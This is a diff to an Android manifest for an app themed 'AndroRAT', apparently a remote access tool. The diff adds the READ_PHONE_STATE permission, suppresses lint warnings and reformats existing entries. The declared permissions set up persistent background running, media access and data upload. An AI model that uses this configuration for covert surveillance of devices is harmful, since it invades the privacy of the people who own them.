@@ -1,6 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools">
+    xmlns:tools="http://schemas.android.com/tools"
+    tools:ignore="SelectedPhotoAccess">
 
     <!-- To upload data-->
     <uses-permission android:name="android.permission.INTERNET" />
@@ -9,7 +10,9 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
     <!-- For trigger service on low battery time-->
-    <uses-permission android:name="android.permission.WAKE_LOCK" tools:node="replace"/>
+    <uses-permission
+        android:name="android.permission.WAKE_LOCK"
+        tools:node="replace" />
 
     <!-- For restarting service after the device is rebooted-->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -72,10 +75,13 @@
         android:minSdkVersion="33" />
     <uses-permission
         android:name="android.permission.READ_MEDIA_VIDEO"
-        android:minSdkVersion="33" />
+        android:minSdkVersion="33"/>
     <uses-permission
         android:name="android.permission.READ_MEDIA_AUDIO"
-        android:minSdkVersion="33" />
+        android:minSdkVersion="33"
+        tools:ignore="SelectedPhotoAccess" />
+
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
 
     <!--below code line only works in android 10 (sdk 29), will not work in android 11 (sdk30)-->
     <!--android:requestLegacyExternalStorage="true"-->
@@ -95,8 +101,8 @@
         tools:targetApi="31">
         <activity
             android:name=".core.ui.MainActivity"
-            android:exported="true"
             android:configChanges="uiMode|locale|layoutDirection|screenSize|screenLayout|orientation"
+            android:exported="true"
             android:theme="@style/Theme.AndroRAT">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
